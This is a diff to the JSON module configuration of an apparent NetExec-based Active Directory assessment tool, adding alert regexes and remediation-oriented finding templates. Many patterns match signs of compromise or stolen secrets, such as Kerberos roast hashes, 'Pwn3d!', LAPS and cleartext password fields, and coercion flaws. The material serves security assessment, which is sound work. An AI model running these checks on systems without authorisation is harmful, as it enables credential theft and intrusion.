         "name": "DNS Enumeration",
         "description": "DNS record enumeration and zone transfer attempts",
         "is_default_import": true,
-        "requires_auth": true,
+        "requires_auth": false,
         "speed_profile": "default",
         "items": [
           {
@@ -1190,9 +1668,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "dns",
               "ad"
@@ -1207,9 +1685,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "dns",
               "ad"
@@ -1224,9 +1702,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "dns",
               "ad"
@@ -1241,17 +1719,24 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
-                "XFR size"
+                "XFR size",
+                "IN\\s+A\\s"
               ]
             },
-            "finding_template": {},
             "tags": [
               "dns"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "DNS Zone Transfer (AXFR) Allowed",
+              "severity": "medium",
+              "cwe": "CWE-200",
+              "remediation": "Restrict zone transfers to authorized secondary servers only."
+            }
           },
           {
             "name": "Dnsrecon Standard",
@@ -1261,9 +1746,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "dns",
               "enum"
@@ -1278,9 +1763,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "dns",
               "enum"
@@ -1308,14 +1793,23 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "smb",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (SMB)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC SMB Auth",
@@ -1325,14 +1819,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "smb",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (SMB)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC RDP Auth (batch)",
@@ -1346,14 +1849,23 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "rdp",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (RDP)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC RDP Auth",
@@ -1363,14 +1875,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "rdp",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (RDP)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC WINRM Auth (batch)",
@@ -1384,14 +1905,23 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "winrm",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (WinRM)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC WINRM Auth",
@@ -1401,14 +1931,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "winrm",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (WinRM)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC MSSQL Auth (batch)",
@@ -1422,14 +1961,23 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "mssql",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (MSSQL)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC MSSQL Auth",
@@ -1439,14 +1987,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "mssql",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (MSSQL)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC SSH Auth (batch)",
@@ -1460,9 +2017,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ssh",
               "auth"
@@ -1477,9 +2034,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ssh",
               "auth"
@@ -1498,9 +2055,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ftp",
               "auth"
@@ -1515,9 +2072,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ftp",
               "auth"
@@ -1536,14 +2093,23 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "wmi",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (WMI)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           },
           {
             "name": "NXC WMI Auth",
@@ -1553,14 +2119,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "critical": [
+                "Pwn3d!"
+              ]
+            },
             "tags": [
               "wmi",
               "auth"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Administrative Access via Provided Credentials (WMI)",
+              "severity": "high",
+              "remediation": "Review privileged group membership / local admin sprawl; enforce tiering and LAPS."
+            }
           }
         ]
       },
@@ -1583,9 +2158,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "shares"
@@ -1600,9 +2175,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "shares"
@@ -1621,9 +2196,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "enum"
@@ -1642,9 +2217,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "enum"
@@ -1663,9 +2238,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
@@ -1684,9 +2259,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "enum"
@@ -1705,18 +2280,28 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
                 "VULNERABLE"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "MS17-010 (EternalBlue) — Unauthenticated SMB RCE",
+              "severity": "critical",
+              "cwe": "CWE-1188",
+              "cve": "CVE-2017-0144",
+              "remediation": "Apply MS17-010; disable SMBv1; segment legacy hosts.",
+              "references": [
+                "https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010"
+              ]
+            }
           },
           {
             "name": "NXC SMB ntlm_reflection (batch)",
@@ -1730,18 +2315,24 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "NTLM Reflection to SMB",
+              "severity": "high",
+              "remediation": "Enforce SMB signing; apply relevant NTLM reflection patches."
+            }
           },
           {
             "name": "NXC SMB printnightmare (batch)",
@@ -1755,18 +2346,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "PrintNightmare — Print Spooler RCE/LPE",
+              "severity": "critical",
+              "cve": "CVE-2021-34527",
+              "remediation": "Patch; disable Print Spooler on servers not printing; restrict Point-and-Print."
+            }
           },
           {
             "name": "NXC SMB remove-mic (batch)",
@@ -1780,18 +2378,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "NTLM MIC Removal (Drop-the-MIC)",
+              "severity": "high",
+              "cve": "CVE-2019-1040",
+              "remediation": "Apply CVE-2019-1040 patches; require MIC + signing."
+            }
           },
           {
             "name": "NXC SMB sccm-recon6 (batch)",
@@ -1805,9 +2410,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "smb",
               "enum"
@@ -1826,18 +2431,24 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
                 "VULNERABLE"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "SMBGhost — SMBv3 Compression RCE",
+              "severity": "critical",
+              "cve": "CVE-2020-0796",
+              "remediation": "Apply KB4551762; disable SMBv3 compression."
+            }
           },
           {
             "name": "NXC SMB spooler (batch)",
@@ -1851,18 +2462,24 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "warning": [
-                "Spooler"
+                "Spooler",
+                "True"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Print Spooler Enabled (PrinterBug coercion vector)",
+              "severity": "high",
+              "remediation": "Disable the Print Spooler service on Domain Controllers and servers that do not print."
+            }
           },
           {
             "name": "NXC SMB webdav (batch)",
@@ -1876,18 +2493,26 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "warning": [
-                "WebDAV"
+                "WebDAV",
+                "True",
+                "WebClient",
+                "Enabled"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "enum"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "WebClient/WebDAV Enabled (HTTP coercion vector)",
+              "severity": "medium",
+              "remediation": "Disable the WebClient service where not required (enables HTTP-based NTLM relay)."
+            }
           },
           {
             "name": "NXC SMB coerce_plus (batch)",
@@ -1901,19 +2526,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln",
               "coercion"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "NTLM Authentication Coercion (coerce_plus)",
+              "severity": "high",
+              "remediation": "Enforce SMB/LDAP signing + channel binding; patch coercion RPCs."
+            }
           },
           {
             "name": "NXC SMB timeroast (batch)",
@@ -1927,14 +2558,24 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\$sntp-ms\\$",
+                ":\\$"
+              ]
+            },
             "tags": [
               "smb",
               "kerberos"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Timeroast — NTP Hash Extraction of Computer Accounts",
+              "severity": "medium",
+              "remediation": "Restrict unauthenticated NTP MS-SNTP; ensure strong machine passwords."
+            }
           },
           {
             "name": "NXC SMB petitpotam (batch)",
@@ -1948,19 +2589,26 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln",
               "coercion"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "PetitPotam — Unauthenticated NTLM Coercion (MS-EFSR)",
+              "severity": "high",
+              "cve": "CVE-2021-36942",
+              "remediation": "Patch; enable EPA/SMB signing; block coercion + restrict ADCS web enrollment (ESC8)."
+            }
           },
           {
             "name": "NXC SMB dfscoerce (batch)",
@@ -1974,19 +2622,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln",
               "coercion"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "DFSCoerce — NTLM Coercion (MS-DFSNM)",
+              "severity": "high",
+              "remediation": "Enforce SMB/LDAP signing + EPA; restrict ADCS web enrollment."
+            }
           },
           {
             "name": "NXC SMB shadowcoerce (batch)",
@@ -2000,19 +2654,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "smb",
               "vuln",
               "coercion"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "ShadowCoerce — NTLM Coercion (MS-FSRVP)",
+              "severity": "high",
+              "remediation": "Patch; enforce signing + EPA."
+            }
           }
         ]
       },
@@ -2031,9 +2691,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "adcs"
@@ -2048,18 +2708,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
-                "VULNERABLE"
+                "VULNERABLE",
+                "Vulnerable",
+                "dMSA"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "BadSuccessor (dMSA) Domain Privilege Escalation",
+              "severity": "high",
+              "remediation": "Restrict dMSA creation/attribute write rights; monitor msDS-DelegatedMSA changes."
+            }
           },
           {
             "name": "NXC LDAP certipy-find",
@@ -2069,18 +2736,27 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "ESC"
+              ],
+              "high": [
+                "ESC",
+                "Vulnerable"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "adcs"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "ADCS Vulnerable Certificate Template (ESCx)",
+              "severity": "high",
+              "remediation": "Remediate the flagged ADCS ESC misconfiguration (enrollment rights, EKU, SAN, manager approval)."
+            }
           },
           {
             "name": "NXC LDAP daclread",
@@ -2090,9 +2766,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "acl"
@@ -2107,18 +2783,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "warning": [
-                "nonsecure"
+                "nonsecure",
+                "insecure",
+                "Non-secure"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "dns"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Non-secure AD-Integrated DNS Updates Allowed",
+              "severity": "medium",
+              "remediation": "Set DNS zones to 'Secure only' dynamic updates."
+            }
           },
           {
             "name": "NXC LDAP dump-computers",
@@ -2128,9 +2811,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2145,9 +2828,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2162,9 +2845,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "dns"
@@ -2179,9 +2862,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2196,14 +2879,24 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "MachineAccountQuota: [1-9]",
+                "quota: [1-9]"
+              ]
+            },
             "tags": [
               "ldap",
               "enum"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Machine Account Quota Allows User-Created Computers",
+              "severity": "medium",
+              "remediation": "Set ms-DS-MachineAccountQuota to 0 and delegate computer join to a service account."
+            }
           },
           {
             "name": "NXC LDAP obsolete",
@@ -2213,18 +2906,29 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "warning": [
-                "OBSOLETE"
+                "OBSOLETE",
+                "Windows 7",
+                "Windows XP",
+                "2003",
+                "2008",
+                "obsolete",
+                "Vista"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Obsolete/Unsupported Operating Systems in Domain",
+              "severity": "medium",
+              "remediation": "Decommission or isolate end-of-life systems."
+            }
           },
           {
             "name": "NXC LDAP pso",
@@ -2234,9 +2938,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2251,9 +2955,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2268,9 +2972,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2285,20 +2989,27 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "warning": [
                 "pass",
-                "pwd"
+                "pwd",
+                "Password",
+                "PASS"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum",
               "creds"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Sensitive Data in AD User Description Fields",
+              "severity": "medium",
+              "remediation": "Remove credentials/secrets from AD description/info attributes."
+            }
           },
           {
             "name": "NXC LDAP get-info-users",
@@ -2308,9 +3019,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2325,14 +3036,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "high": [
+                "unixUserPassword"
+              ]
+            },
             "tags": [
               "ldap",
               "creds"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Cleartext Password in LDAP unixUserPassword",
+              "severity": "high",
+              "remediation": "Remove cleartext credentials from unixUserPassword attributes."
+            }
           },
           {
             "name": "NXC LDAP get-userPassword",
@@ -2342,14 +3062,23 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "high": [
+                "userPassword"
+              ]
+            },
             "tags": [
               "ldap",
               "creds"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Reversible/Cleartext Password in LDAP userPassword",
+              "severity": "high",
+              "remediation": "Remove cleartext passwords stored in userPassword; disable reversible encryption."
+            }
           },
           {
             "name": "NXC LDAP laps",
@@ -2359,18 +3088,28 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "LAPS"
+              ],
+              "warning": [
+                "ms-Mcs-AdmPwd",
+                "LAPS",
+                "Password:"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "creds"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "LAPS Local Admin Password Readable",
+              "severity": "medium",
+              "remediation": "Restrict LAPS password read rights to authorized administrators only."
+            }
           },
           {
             "name": "NXC LDAP pre2k",
@@ -2380,14 +3119,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "VALID",
+                "pre2k",
+                "pre-created"
+              ]
+            },
             "tags": [
               "ldap",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Pre-Windows 2000 Computer Accounts (predictable password)",
+              "severity": "medium",
+              "remediation": "Reset or remove stale pre-created computer accounts."
+            }
           },
           {
             "name": "NXC LDAP ldap-checker",
@@ -2397,18 +3147,26 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "warning": [
-                "VULN"
+                "VULN",
+                "not enforced",
+                "not required",
+                "channel binding"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "vuln"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "LDAP Signing / Channel Binding Not Enforced",
+              "severity": "medium",
+              "remediation": "Enforce LDAP signing and LDAP channel binding on Domain Controllers."
+            }
           },
           {
             "name": "NXC LDAP groupmembership",
@@ -2418,9 +3176,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2435,9 +3193,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2452,18 +3210,28 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "\\$krb5asrep\\$"
+              ],
+              "high": [
+                "\\$krb5asrep\\$",
+                "asrep"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "kerberos"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "AS-REP Roastable Accounts (Kerberos pre-auth disabled)",
+              "severity": "high",
+              "cwe": "CWE-262",
+              "remediation": "Enable 'Do not require Kerberos preauthentication' = false for all accounts; use strong passwords."
+            }
           },
           {
             "name": "NXC LDAP Kerberoast",
@@ -2473,18 +3241,27 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {
               "critical": [
                 "\\$krb5tgs\\$"
+              ],
+              "high": [
+                "\\$krb5tgs\\$"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "kerberos"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Kerberoastable Service Accounts (SPNs)",
+              "severity": "high",
+              "cwe": "CWE-262",
+              "remediation": "Use 25+ char passwords or gMSAs for service accounts; remove stale SPNs; AES-only."
+            }
           },
           {
             "name": "NXC LDAP Find Delegation",
@@ -2494,18 +3271,27 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "warning": [
-                "Unconstrained"
+                "Unconstrained",
+                "Delegation",
+                "TRUSTED_TO_AUTH",
+                "UNCONSTRAINED",
+                "CONSTRAINED"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "delegation"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Kerberos Delegation Configured",
+              "severity": "high",
+              "remediation": "Audit delegation; mark privileged accounts 'sensitive and cannot be delegated'; avoid unconstrained delegation."
+            }
           },
           {
             "name": "NXC LDAP Trusted For Delegation",
@@ -2515,13 +3301,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "warning": [
                 "TRUSTED_FOR_DELEGATION"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "delegation"
@@ -2536,13 +3322,13 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {
               "warning": [
                 "PASSWD_NOTREQD"
               ]
             },
-            "finding_template": {},
             "tags": [
               "ldap",
               "vuln"
@@ -2557,9 +3343,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2574,9 +3360,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
@@ -2591,9 +3377,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 120,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "ldap",
               "enum"
